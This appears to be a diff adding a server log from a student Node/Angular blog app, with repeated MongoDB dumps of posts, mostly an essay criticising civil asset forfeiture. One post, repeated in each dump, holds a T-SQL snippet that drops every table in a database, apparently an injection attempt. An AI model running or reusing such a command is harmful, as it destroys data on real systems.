The fact that some police view the income as necessary implies that revenue could be a factor when police are considering making forfeiture actions. For example, “officers from the Volusia County Sheriff’s Office in Florida who stopped vehicles on southbound I-95 […] routinely confiscated any money over one-hundred dollars under the assumption that money in such quantity must be drug money” (Chi 1646). Such actions do little to combat crime and serve little purpose beyond income generation. Volusia officers, as well as many other agencies, would “haggl[e] with the motorists […] allowing the motorists to retain a portion of the money in exchange for an agreement not to contest the forfeiture” in order to make the income more reliable (Chi 1646). In such instances it appears that the law enforcement personnel are primarily motivated by revenue generation in their policing. This conflicts with both the intended purpose of police, to protect and serve, and the ethical standards that police should be held to. Additionally, the ability of police to even partially self-finance can make them less politically accountable to the legislature, who is primarily responsible for their funding. The profitability of civil asset forfeiture inherently creates a conflict of interest and will encourage seizures for the sake of revenue until the incentive is removed.\n\nFurthermore, innocent property can be easily seized in many states that require low burdens of proof to make forfeiture actions. For example, in Massachusetts, the law only requires probable cause to seize assets. The law also enables police to seize “any vehicles, money, or real property used in connection with a controlled substance” (Crawford 265). In essence, the seizure of drug-related property may seem reasonable, but because only probable cause must be provided, the state does not need to prove a connection between the property and a drug transaction (Crawford 264). When establishing probable cause in Massachusetts, prosecutors can use questionable evidence such as “hearsay evidence—which would be inadmissible in a trial— in forfeiture actions” (Crawford 268). Thirteen states require only probable cause to seize assets and only four require assets to be connected to criminal activity beyond a reasonable doubt, which puts many law abiding property owners at risk (Holcomb et al. 278). Considering the undemanding requirements for establishing probable cause, many legal possessions can be considered suspicious and be confiscated. In the court case United States v. $124,700 it was ruled that “‘[p]ossession of a large sum of cash is ‘strong evidence’ of a connection to drug activity’” (qtd. in Moorse 779). The ease with which prosecutors can attain probable cause, using little to no substantial evidence, puts many law abiding people and their property in jeopardy.\n\nForfeiture laws, because they are a civil action against property, rather than a person, have unique procedures that often provide little protection for implicated persons. Rather than having a trial, once the state has started an action against a property, the prosecutor merely submits affidavits that established that the burden of proof is met to justify a seizure (Crawford 265). In 36 states and under federal law, after the property is seized, the burden of proving the innocence of the property is placed solely on the owner (Holcomb et al. 277, Crawford 264). Due to the ‘guilty until proven innocent’ nature of civil forfeiture, paired with often low burdens of proof, many innocent property owners are placed at risk of having their property seized.\n\nHaving wrongfully seized property returned can be a lengthy and potentially expensive process. For example, in 2009, a motel in Massachusetts was seized with probable cause that the owner was involved in criminal activity, on the basis that 15 of the roughly 125,000 patrons served over two decades had been arrested on drug charges (Crawford 257-259). After a three-year legal battle, costing the owners over $100,000, the property was returned; had the case not been taken by a public interest law firm pro bono once the motel owners exhausted their funds, the state would have kept the property. Similarly, the high legal fees associated with contesting a forfeiture are often a barrier preventing property owners from attempting to retain their property. Because the cases are civil in nature, under state laws the property owner does not necessarily have the right to a public defender if they cannot afford a lawyer, as the Sixth Amendment does not apply to non-criminal cases (Crawford 273, 282). As a result forfeiture actions are disproportionately detrimental to indigent parties who will often choose to forgo legal action (Crawford 277-78). Furthermore, law enforcement may choose to specifically choose to target persons who may not have the funds to contest a forfeiture. As in the case of the motel discussed previously, while it was not the only motel where arrests had been made, it was the only one independently owned and operated; consequently it was the only one that saw forfeiture actions taken against it (Crawford 273). This illustrates how the flawed legal process of civil asset forfeiture can victimize property owners and facilitate abuse of forfeiture powers.\n\nThere have been previous attempts to reform civil asset forfeiture. In the 1990s, civil asset forfeiture started to draw large amounts of criticism, both ethically and constitutionally under the First, Fifth, Sixth and Eighth Amendments (Crawford 263). The constitutional challenges failed and the law was upheld; however, legislation would be passed to address the prevalent issues with federal forfeiture laws (Crawford 263). The first reform of federal forfeiture laws came in the Civil Asset Forfeiture Reform Act (CAFRA) in 2000 (Crawford 264). CAFRA would provide for the appointment of legal counsel in cases where a property owner\'s primary residence is in jeopardy, if they request it (Crawford 264). Also, CAFRA rendered the government liable for the property owner’s attorney fees and other expenses from litigation when “the claimant ‘substantially prevails’” (Crawford 264). This would become a massive benefit to law-abiding citizens whose property was wrongly seized, but it provided no benefit to the claimant if the case was lost. In addition, CAFRA increased the burden of proof from probable cause to “preponderance of evidence,” (Crawford 265). Preponderance of evidence is one degree of certainty above probable cause and “implies a ‘more likely than not’ character” (Holcomb et al 277). Raising the burden of proof provided suspected persons and their property with some more protection and made their assets more difficult to seize. While CAFRA did contain valuable reforms, it pertained exclusively to federal laws and in no way addressed forfeiture under state laws, and while it did raise the burden of proof, it still may provide citizens with inadequate protection.',
+  userName: 'Jeep Guy',
+  userEmail: 'nut@tissues.tv' }
+{ _id: 5cbd2db8bae1b279e4edd9fc,
+  blogTitle: 'Issues with Civil Asset Forfeiture',
+  blogText: 'For decades police have been under harsh scrutiny for their behavioral practices. In particular, the practice of civil asset forfeiture has been highly controversial. Civil asset forfeiture is a process where a government law enforcement agency seizes property on the basis that it may be connected to a crime (Crawford 260). Unlike criminal asset forfeiture, civil asset forfeiture is an action filed against property itself and not the owner (Crawford 260). A civil asset forfeiture does not need to be accompanied by criminal charges to the owner and has no other legal implication beyond loss of property (Crawford 258). Civil asset forfeiture started becoming commonplace in America in the 1970s, when Congress passed the Comprehensive Drug Abuse Prevention and Control Act, which gave law enforcement the right to seize drugs and equipment related to its manufacture, storage or distribution (Crawford 261-62). Further legislation expanded seizure powers to include alleged proceeds and real property related to criminal activity (Crawford 262). While those laws are federal, all states have their own forfeiture laws, and the federal laws set a precedent for how forfeitures should be utilized by police. Forfeiture has proved to be an effective tool for law enforcement because it enables them to both seize the proceeds from alleged crimes, as well as seize property that may be used to facilitate crime. However, current civil asset forfeiture laws are fundamentally flawed and need to be revised to protect citizens and prevent abuse.\n\nMany current forfeiture laws provide police with questionable incentives to make seizures of property. Since forfeitures processed through most state laws, as well as those processed under federal law, direct most of the proceeds to law enforcement, there is a serious conflict of interest and the creation of flawed incentives. Law enforcement agencies may become motivated to prioritize cases on the basis of profitability instead of fair application of the law. While state laws do vary, all but eight states give at least 50% of the proceeds from forfeitures to the law enforcement agency, with 26 states giving 100% of the proceeds to law enforcement (Holcomb et al. 277). A 2001 survey of 770 police executives and managers found that “almost forty (40) percent of respondents agreed or strongly agreed to the statement that civil forfeiture is ‘necessary as a budget supplement’” (Holcomb 275). The fact that some police view the income as necessary implies that revenue could be a factor when police are considering making forfeiture actions. For example, “officers from the Volusia County Sheriff’s Office in Florida who stopped vehicles on southbound I-95 […] routinely confiscated any money over one-hundred dollars under the assumption that money in such quantity must be drug money” (Chi 1646). Such actions do little to combat crime and serve little purpose beyond income generation. Volusia officers, as well as many other agencies, would “haggl[e] with the motorists […] allowing the motorists to retain a portion of the money in exchange for an agreement not to contest the forfeiture” in order to make the income more reliable (Chi 1646). In such instances it appears that the law enforcement personnel are primarily motivated by revenue generation in their policing. This conflicts with both the intended purpose of police, to protect and serve, and the ethical standards that police should be held to. Additionally, the ability of police to even partially self-finance can make them less politically accountable to the legislature, who is primarily responsible for their funding. The profitability of civil asset forfeiture inherently creates a conflict of interest and will encourage seizures for the sake of revenue until the incentive is removed.\n\nFurthermore, innocent property can be easily seized in many states that require low burdens of proof to make forfeiture actions. For example, in Massachusetts, the law only requires probable cause to seize assets. The law also enables police to seize “any vehicles, money, or real property used in connection with a controlled substance” (Crawford 265). In essence, the seizure of drug-related property may seem reasonable, but because only probable cause must be provided, the state does not need to prove a connection between the property and a drug transaction (Crawford 264). When establishing probable cause in Massachusetts, prosecutors can use questionable evidence such as “hearsay evidence—which would be inadmissible in a trial— in forfeiture actions” (Crawford 268). Thirteen states require only probable cause to seize assets and only four require assets to be connected to criminal activity beyond a reasonable doubt, which puts many law abiding property owners at risk (Holcomb et al. 278). Considering the undemanding requirements for establishing probable cause, many legal possessions can be considered suspicious and be confiscated. In the court case United States v. $124,700 it was ruled that “‘[p]ossession of a large sum of cash is ‘strong evidence’ of a connection to drug activity’” (qtd. in Moorse 779). The ease with which prosecutors can attain probable cause, using little to no substantial evidence, puts many law abiding people and their property in jeopardy.\n\nForfeiture laws, because they are a civil action against property, rather than a person, have unique procedures that often provide little protection for implicated persons. Rather than having a trial, once the state has started an action against a property, the prosecutor merely submits affidavits that established that the burden of proof is met to justify a seizure (Crawford 265). In 36 states and under federal law, after the property is seized, the burden of proving the innocence of the property is placed solely on the owner (Holcomb et al. 277, Crawford 264). Due to the ‘guilty until proven innocent’ nature of civil forfeiture, paired with often low burdens of proof, many innocent property owners are placed at risk of having their property seized.\n\nHaving wrongfully seized property returned can be a lengthy and potentially expensive process. For example, in 2009, a motel in Massachusetts was seized with probable cause that the owner was involved in criminal activity, on the basis that 15 of the roughly 125,000 patrons served over two decades had been arrested on drug charges (Crawford 257-259). After a three-year legal battle, costing the owners over $100,000, the property was returned; had the case not been taken by a public interest law firm pro bono once the motel owners exhausted their funds, the state would have kept the property. Similarly, the high legal fees associated with contesting a forfeiture are often a barrier preventing property owners from attempting to retain their property. Because the cases are civil in nature, under state laws the property owner does not necessarily have the right to a public defender if they cannot afford a lawyer, as the Sixth Amendment does not apply to non-criminal cases (Crawford 273, 282). As a result forfeiture actions are disproportionately detrimental to indigent parties who will often choose to forgo legal action (Crawford 277-78). Furthermore, law enforcement may choose to specifically choose to target persons who may not have the funds to contest a forfeiture. As in the case of the motel discussed previously, while it was not the only motel where arrests had been made, it was the only one independently owned and operated; consequently it was the only one that saw forfeiture actions taken against it (Crawford 273). This illustrates how the flawed legal process of civil asset forfeiture can victimize property owners and facilitate abuse of forfeiture powers.\n\nThere have been previous attempts to reform civil asset forfeiture. In the 1990s, civil asset forfeiture started to draw large amounts of criticism, both ethically and constitutionally under the First, Fifth, Sixth and Eighth Amendments (Crawford 263). The constitutional challenges failed and the law was upheld; however, legislation would be passed to address the prevalent issues with federal forfeiture laws (Crawford 263). The first reform of federal forfeiture laws came in the Civil Asset Forfeiture Reform Act (CAFRA) in 2000 (Crawford 264). CAFRA would provide for the appointment of legal counsel in cases where a property owner\'s primary residence is in jeopardy, if they request it (Crawford 264). Also, CAFRA rendered the government liable for the property owner’s attorney fees and other expenses from litigation when “the claimant ‘substantially prevails’” (Crawford 264). This would become a massive benefit to law-abiding citizens whose property was wrongly seized, but it provided no benefit to the claimant if the case was lost. In addition, CAFRA increased the burden of proof from probable cause to “preponderance of evidence,” (Crawford 265). Preponderance of evidence is one degree of certainty above probable cause and “implies a ‘more likely than not’ character” (Holcomb et al 277). Raising the burden of proof provided suspected persons and their property with some more protection and made their assets more difficult to seize. While CAFRA did contain valuable reforms, it pertained exclusively to federal laws and in no way addressed forfeiture under state laws, and while it did raise the burden of proof, it still may provide citizens with inadequate protection.',
+  userName: 'Jeep Guy',
+  userEmail: 'nut@tissues.tv',
+  createdOn: 2019-04-22T02:58:00.898Z,
+  __v: 0 }
+[0mPOST /api/blog [32m201 [0m4.068 ms - 9732[0m
+[0mGET / [36m304 [0m0.558 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m0.304 ms - -[0m
+[0mGET /lib/angular-ui-router.min.js [36m304 [0m0.268 ms - -[0m
+[0mGET /blogApp.js [36m304 [0m0.283 ms - -[0m
+[0mGET /common/nav/navigation.js [36m304 [0m0.271 ms - -[0m
+[0mGET /nav/navigation.html [36m304 [0m0.355 ms - -[0m
+Blog ID 5cbd2c68bae1b279e4edd9fb deleted
+[0mDELETE /api/blog/5cbd2c68bae1b279e4edd9fb [32m204 [0m1.452 ms - -[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 },
+  { _id: 5cbd276dbae1b279e4edd9f6,
+    blogTitle: 'Get a life',
+    blogText: 'You\'re been hackskeepered',
+    userName: 'Anonymous Troll',
+    userEmail: 'troll@gmail.com',
+    createdOn: 2019-04-22T02:31:09.006Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9f9,
+    blogTitle: 'hmm',
+    blogText: 'DECLARE @sql NVARCHAR(max)=\'\'\n\nSELECT @sql += \' Drop table \' + QUOTENAME(TABLE_SCHEMA) + \'.\'+ QUOTENAME(TABLE_NAME) + \'; \'\nFROM   INFORMATION_SCHEMA.TABLES\nWHERE  TABLE_TYPE = \'BASE TABLE\'\n\nExec Sp_executesql @sql',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:33:01.566Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9fa,
+    blogTitle: 'My name is Grant',
+    blogText: 'And I suck.',
+    userName: 'Grant_Sucks',
+    userEmail: 'grant@sucks.biz',
+    createdOn: 2019-04-22T02:33:01.810Z,
+    __v: 0 },
+  { _id: 5cbd2db8bae1b279e4edd9fc,
+    blogTitle: 'Issues with Civil Asset Forfeiture',
+    blogText: 'For decades police have been under harsh scrutiny for their behavioral practices. In particular, the practice of civil asset forfeiture has been highly controversial. Civil asset forfeiture is a process where a government law enforcement agency seizes property on the basis that it may be connected to a crime (Crawford 260). Unlike criminal asset forfeiture, civil asset forfeiture is an action filed against property itself and not the owner (Crawford 260). A civil asset forfeiture does not need to be accompanied by criminal charges to the owner and has no other legal implication beyond loss of property (Crawford 258). Civil asset forfeiture started becoming commonplace in America in the 1970s, when Congress passed the Comprehensive Drug Abuse Prevention and Control Act, which gave law enforcement the right to seize drugs and equipment related to its manufacture, storage or distribution (Crawford 261-62). Further legislation expanded seizure powers to include alleged proceeds and real property related to criminal activity (Crawford 262). While those laws are federal, all states have their own forfeiture laws, and the federal laws set a precedent for how forfeitures should be utilized by police. Forfeiture has proved to be an effective tool for law enforcement because it enables them to both seize the proceeds from alleged crimes, as well as seize property that may be used to facilitate crime. However, current civil asset forfeiture laws are fundamentally flawed and need to be revised to protect citizens and prevent abuse.\n\nMany current forfeiture laws provide police with questionable incentives to make seizures of property. Since forfeitures processed through most state laws, as well as those processed under federal law, direct most of the proceeds to law enforcement, there is a serious conflict of interest and the creation of flawed incentives. Law enforcement agencies may become motivated to prioritize cases on the basis of profitability instead of fair application of the law. While state laws do vary, all but eight states give at least 50% of the proceeds from forfeitures to the law enforcement agency, with 26 states giving 100% of the proceeds to law enforcement (Holcomb et al. 277). A 2001 survey of 770 police executives and managers found that “almost forty (40) percent of respondents agreed or strongly agreed to the statement that civil forfeiture is ‘necessary as a budget supplement’” (Holcomb 275). The fact that some police view the income as necessary implies that revenue could be a factor when police are considering making forfeiture actions. For example, “officers from the Volusia County Sheriff’s Office in Florida who stopped vehicles on southbound I-95 […] routinely confiscated any money over one-hundred dollars under the assumption that money in such quantity must be drug money” (Chi 1646). Such actions do little to combat crime and serve little purpose beyond income generation. Volusia officers, as well as many other agencies, would “haggl[e] with the motorists […] allowing the motorists to retain a portion of the money in exchange for an agreement not to contest the forfeiture” in order to make the income more reliable (Chi 1646). In such instances it appears that the law enforcement personnel are primarily motivated by revenue generation in their policing. This conflicts with both the intended purpose of police, to protect and serve, and the ethical standards that police should be held to. Additionally, the ability of police to even partially self-finance can make them less politically accountable to the legislature, who is primarily responsible for their funding. The profitability of civil asset forfeiture inherently creates a conflict of interest and will encourage seizures for the sake of revenue until the incentive is removed.\n\nFurthermore, innocent property can be easily seized in many states that require low burdens of proof to make forfeiture actions. For example, in Massachusetts, the law only requires probable cause to seize assets. The law also enables police to seize “any vehicles, money, or real property used in connection with a controlled substance” (Crawford 265). In essence, the seizure of drug-related property may seem reasonable, but because only probable cause must be provided, the state does not need to prove a connection between the property and a drug transaction (Crawford 264). When establishing probable cause in Massachusetts, prosecutors can use questionable evidence such as “hearsay evidence—which would be inadmissible in a trial— in forfeiture actions” (Crawford 268). Thirteen states require only probable cause to seize assets and only four require assets to be connected to criminal activity beyond a reasonable doubt, which puts many law abiding property owners at risk (Holcomb et al. 278). Considering the undemanding requirements for establishing probable cause, many legal possessions can be considered suspicious and be confiscated. In the court case United States v. $124,700 it was ruled that “‘[p]ossession of a large sum of cash is ‘strong evidence’ of a connection to drug activity’” (qtd. in Moorse 779). The ease with which prosecutors can attain probable cause, using little to no substantial evidence, puts many law abiding people and their property in jeopardy.\n\nForfeiture laws, because they are a civil action against property, rather than a person, have unique procedures that often provide little protection for implicated persons. Rather than having a trial, once the state has started an action against a property, the prosecutor merely submits affidavits that established that the burden of proof is met to justify a seizure (Crawford 265). In 36 states and under federal law, after the property is seized, the burden of proving the innocence of the property is placed solely on the owner (Holcomb et al. 277, Crawford 264). Due to the ‘guilty until proven innocent’ nature of civil forfeiture, paired with often low burdens of proof, many innocent property owners are placed at risk of having their property seized.\n\nHaving wrongfully seized property returned can be a lengthy and potentially expensive process. For example, in 2009, a motel in Massachusetts was seized with probable cause that the owner was involved in criminal activity, on the basis that 15 of the roughly 125,000 patrons served over two decades had been arrested on drug charges (Crawford 257-259). After a three-year legal battle, costing the owners over $100,000, the property was returned; had the case not been taken by a public interest law firm pro bono once the motel owners exhausted their funds, the state would have kept the property. Similarly, the high legal fees associated with contesting a forfeiture are often a barrier preventing property owners from attempting to retain their property. Because the cases are civil in nature, under state laws the property owner does not necessarily have the right to a public defender if they cannot afford a lawyer, as the Sixth Amendment does not apply to non-criminal cases (Crawford 273, 282). As a result forfeiture actions are disproportionately detrimental to indigent parties who will often choose to forgo legal action (Crawford 277-78). Furthermore, law enforcement may choose to specifically choose to target persons who may not have the funds to contest a forfeiture. As in the case of the motel discussed previously, while it was not the only motel where arrests had been made, it was the only one independently owned and operated; consequently it was the only one that saw forfeiture actions taken against it (Crawford 273). This illustrates how the flawed legal process of civil asset forfeiture can victimize property owners and facilitate abuse of forfeiture powers.\n\nThere have been previous attempts to reform civil asset forfeiture. In the 1990s, civil asset forfeiture started to draw large amounts of criticism, both ethically and constitutionally under the First, Fifth, Sixth and Eighth Amendments (Crawford 263). The constitutional challenges failed and the law was upheld; however, legislation would be passed to address the prevalent issues with federal forfeiture laws (Crawford 263). The first reform of federal forfeiture laws came in the Civil Asset Forfeiture Reform Act (CAFRA) in 2000 (Crawford 264). CAFRA would provide for the appointment of legal counsel in cases where a property owner\'s primary residence is in jeopardy, if they request it (Crawford 264). Also, CAFRA rendered the government liable for the property owner’s attorney fees and other expenses from litigation when “the claimant ‘substantially prevails’” (Crawford 264). This would become a massive benefit to law-abiding citizens whose property was wrongly seized, but it provided no benefit to the claimant if the case was lost. In addition, CAFRA increased the burden of proof from probable cause to “preponderance of evidence,” (Crawford 265). Preponderance of evidence is one degree of certainty above probable cause and “implies a ‘more likely than not’ character” (Holcomb et al 277). Raising the burden of proof provided suspected persons and their property with some more protection and made their assets more difficult to seize. While CAFRA did contain valuable reforms, it pertained exclusively to federal laws and in no way addressed forfeiture under state laws, and while it did raise the burden of proof, it still may provide citizens with inadequate protection.',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:58:00.898Z,
+    __v: 0 } ]
+[0mGET /api/blog [32m200 [0m3.323 ms - 10852[0m
+[0mGET / [36m304 [0m0.370 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m0.362 ms - -[0m
+[0mGET /lib/angular-ui-router.min.js [36m304 [0m0.285 ms - -[0m
+[0mGET /blogApp.js [36m304 [0m0.288 ms - -[0m
+[0mGET /common/nav/navigation.js [36m304 [0m0.282 ms - -[0m
+[0mGET /nav/navigation.html [36m304 [0m0.408 ms - -[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 },
+  { _id: 5cbd276dbae1b279e4edd9f6,
+    blogTitle: 'Get a life',
+    blogText: 'You\'re been hackskeepered',
+    userName: 'Anonymous Troll',
+    userEmail: 'troll@gmail.com',
+    createdOn: 2019-04-22T02:31:09.006Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9f9,
+    blogTitle: 'hmm',
+    blogText: 'DECLARE @sql NVARCHAR(max)=\'\'\n\nSELECT @sql += \' Drop table \' + QUOTENAME(TABLE_SCHEMA) + \'.\'+ QUOTENAME(TABLE_NAME) + \'; \'\nFROM   INFORMATION_SCHEMA.TABLES\nWHERE  TABLE_TYPE = \'BASE TABLE\'\n\nExec Sp_executesql @sql',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:33:01.566Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9fa,
+    blogTitle: 'My name is Grant',
+    blogText: 'And I suck.',
+    userName: 'Grant_Sucks',
+    userEmail: 'grant@sucks.biz',
+    createdOn: 2019-04-22T02:33:01.810Z,
+    __v: 0 },
+  { _id: 5cbd2db8bae1b279e4edd9fc,
+    blogTitle: 'Issues with Civil Asset Forfeiture',
+    blogText: 'For decades police have been under harsh scrutiny for their behavioral practices. In particular, the practice of civil asset forfeiture has been highly controversial. Civil asset forfeiture is a process where a government law enforcement agency seizes property on the basis that it may be connected to a crime (Crawford 260). Unlike criminal asset forfeiture, civil asset forfeiture is an action filed against property itself and not the owner (Crawford 260). A civil asset forfeiture does not need to be accompanied by criminal charges to the owner and has no other legal implication beyond loss of property (Crawford 258). Civil asset forfeiture started becoming commonplace in America in the 1970s, when Congress passed the Comprehensive Drug Abuse Prevention and Control Act, which gave law enforcement the right to seize drugs and equipment related to its manufacture, storage or distribution (Crawford 261-62). Further legislation expanded seizure powers to include alleged proceeds and real property related to criminal activity (Crawford 262). While those laws are federal, all states have their own forfeiture laws, and the federal laws set a precedent for how forfeitures should be utilized by police. Forfeiture has proved to be an effective tool for law enforcement because it enables them to both seize the proceeds from alleged crimes, as well as seize property that may be used to facilitate crime. However, current civil asset forfeiture laws are fundamentally flawed and need to be revised to protect citizens and prevent abuse.\n\nMany current forfeiture laws provide police with questionable incentives to make seizures of property. Since forfeitures processed through most state laws, as well as those processed under federal law, direct most of the proceeds to law enforcement, there is a serious conflict of interest and the creation of flawed incentives. Law enforcement agencies may become motivated to prioritize cases on the basis of profitability instead of fair application of the law. While state laws do vary, all but eight states give at least 50% of the proceeds from forfeitures to the law enforcement agency, with 26 states giving 100% of the proceeds to law enforcement (Holcomb et al. 277). A 2001 survey of 770 police executives and managers found that “almost forty (40) percent of respondents agreed or strongly agreed to the statement that civil forfeiture is ‘necessary as a budget supplement’” (Holcomb 275). The fact that some police view the income as necessary implies that revenue could be a factor when police are considering making forfeiture actions. For example, “officers from the Volusia County Sheriff’s Office in Florida who stopped vehicles on southbound I-95 […] routinely confiscated any money over one-hundred dollars under the assumption that money in such quantity must be drug money” (Chi 1646). Such actions do little to combat crime and serve little purpose beyond income generation. Volusia officers, as well as many other agencies, would “haggl[e] with the motorists […] allowing the motorists to retain a portion of the money in exchange for an agreement not to contest the forfeiture” in order to make the income more reliable (Chi 1646). In such instances it appears that the law enforcement personnel are primarily motivated by revenue generation in their policing. This conflicts with both the intended purpose of police, to protect and serve, and the ethical standards that police should be held to. Additionally, the ability of police to even partially self-finance can make them less politically accountable to the legislature, who is primarily responsible for their funding. The profitability of civil asset forfeiture inherently creates a conflict of interest and will encourage seizures for the sake of revenue until the incentive is removed.\n\nFurthermore, innocent property can be easily seized in many states that require low burdens of proof to make forfeiture actions. For example, in Massachusetts, the law only requires probable cause to seize assets. The law also enables police to seize “any vehicles, money, or real property used in connection with a controlled substance” (Crawford 265). In essence, the seizure of drug-related property may seem reasonable, but because only probable cause must be provided, the state does not need to prove a connection between the property and a drug transaction (Crawford 264). When establishing probable cause in Massachusetts, prosecutors can use questionable evidence such as “hearsay evidence—which would be inadmissible in a trial— in forfeiture actions” (Crawford 268). Thirteen states require only probable cause to seize assets and only four require assets to be connected to criminal activity beyond a reasonable doubt, which puts many law abiding property owners at risk (Holcomb et al. 278). Considering the undemanding requirements for establishing probable cause, many legal possessions can be considered suspicious and be confiscated. In the court case United States v. $124,700 it was ruled that “‘[p]ossession of a large sum of cash is ‘strong evidence’ of a connection to drug activity’” (qtd. in Moorse 779). The ease with which prosecutors can attain probable cause, using little to no substantial evidence, puts many law abiding people and their property in jeopardy.\n\nForfeiture laws, because they are a civil action against property, rather than a person, have unique procedures that often provide little protection for implicated persons. Rather than having a trial, once the state has started an action against a property, the prosecutor merely submits affidavits that established that the burden of proof is met to justify a seizure (Crawford 265). In 36 states and under federal law, after the property is seized, the burden of proving the innocence of the property is placed solely on the owner (Holcomb et al. 277, Crawford 264). Due to the ‘guilty until proven innocent’ nature of civil forfeiture, paired with often low burdens of proof, many innocent property owners are placed at risk of having their property seized.\n\nHaving wrongfully seized property returned can be a lengthy and potentially expensive process. For example, in 2009, a motel in Massachusetts was seized with probable cause that the owner was involved in criminal activity, on the basis that 15 of the roughly 125,000 patrons served over two decades had been arrested on drug charges (Crawford 257-259). After a three-year legal battle, costing the owners over $100,000, the property was returned; had the case not been taken by a public interest law firm pro bono once the motel owners exhausted their funds, the state would have kept the property. Similarly, the high legal fees associated with contesting a forfeiture are often a barrier preventing property owners from attempting to retain their property. Because the cases are civil in nature, under state laws the property owner does not necessarily have the right to a public defender if they cannot afford a lawyer, as the Sixth Amendment does not apply to non-criminal cases (Crawford 273, 282). As a result forfeiture actions are disproportionately detrimental to indigent parties who will often choose to forgo legal action (Crawford 277-78). Furthermore, law enforcement may choose to specifically choose to target persons who may not have the funds to contest a forfeiture. As in the case of the motel discussed previously, while it was not the only motel where arrests had been made, it was the only one independently owned and operated; consequently it was the only one that saw forfeiture actions taken against it (Crawford 273). This illustrates how the flawed legal process of civil asset forfeiture can victimize property owners and facilitate abuse of forfeiture powers.\n\nThere have been previous attempts to reform civil asset forfeiture. In the 1990s, civil asset forfeiture started to draw large amounts of criticism, both ethically and constitutionally under the First, Fifth, Sixth and Eighth Amendments (Crawford 263). The constitutional challenges failed and the law was upheld; however, legislation would be passed to address the prevalent issues with federal forfeiture laws (Crawford 263). The first reform of federal forfeiture laws came in the Civil Asset Forfeiture Reform Act (CAFRA) in 2000 (Crawford 264). CAFRA would provide for the appointment of legal counsel in cases where a property owner\'s primary residence is in jeopardy, if they request it (Crawford 264). Also, CAFRA rendered the government liable for the property owner’s attorney fees and other expenses from litigation when “the claimant ‘substantially prevails’” (Crawford 264). This would become a massive benefit to law-abiding citizens whose property was wrongly seized, but it provided no benefit to the claimant if the case was lost. In addition, CAFRA increased the burden of proof from probable cause to “preponderance of evidence,” (Crawford 265). Preponderance of evidence is one degree of certainty above probable cause and “implies a ‘more likely than not’ character” (Holcomb et al 277). Raising the burden of proof provided suspected persons and their property with some more protection and made their assets more difficult to seize. While CAFRA did contain valuable reforms, it pertained exclusively to federal laws and in no way addressed forfeiture under state laws, and while it did raise the burden of proof, it still may provide citizens with inadequate protection.',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:58:00.898Z,
+    __v: 0 } ]
+[0mGET /api/blog [32m200 [0m3.187 ms - 10852[0m
+[0mGET / [36m304 [0m0.362 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m0.375 ms - -[0m
+[0mGET /lib/angular-ui-router.min.js [36m304 [0m0.354 ms - -[0m
+[0mGET /blogApp.js [36m304 [0m0.290 ms - -[0m
+[0mGET /common/nav/navigation.js [36m304 [0m0.286 ms - -[0m
+[0mGET /nav/navigation.html [36m304 [0m0.338 ms - -[0m
+[0mGET /favicon.ico [33m404 [0m0.740 ms - 1395[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 },
+  { _id: 5cbd276dbae1b279e4edd9f6,
+    blogTitle: 'Get a life',
+    blogText: 'You\'re been hackskeepered',
+    userName: 'Anonymous Troll',
+    userEmail: 'troll@gmail.com',
+    createdOn: 2019-04-22T02:31:09.006Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9f9,
+    blogTitle: 'hmm',
+    blogText: 'DECLARE @sql NVARCHAR(max)=\'\'\n\nSELECT @sql += \' Drop table \' + QUOTENAME(TABLE_SCHEMA) + \'.\'+ QUOTENAME(TABLE_NAME) + \'; \'\nFROM   INFORMATION_SCHEMA.TABLES\nWHERE  TABLE_TYPE = \'BASE TABLE\'\n\nExec Sp_executesql @sql',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:33:01.566Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9fa,
+    blogTitle: 'My name is Grant',
+    blogText: 'And I suck.',
+    userName: 'Grant_Sucks',
+    userEmail: 'grant@sucks.biz',
+    createdOn: 2019-04-22T02:33:01.810Z,
+    __v: 0 },
+  { _id: 5cbd2db8bae1b279e4edd9fc,
+    blogTitle: 'Issues with Civil Asset Forfeiture',
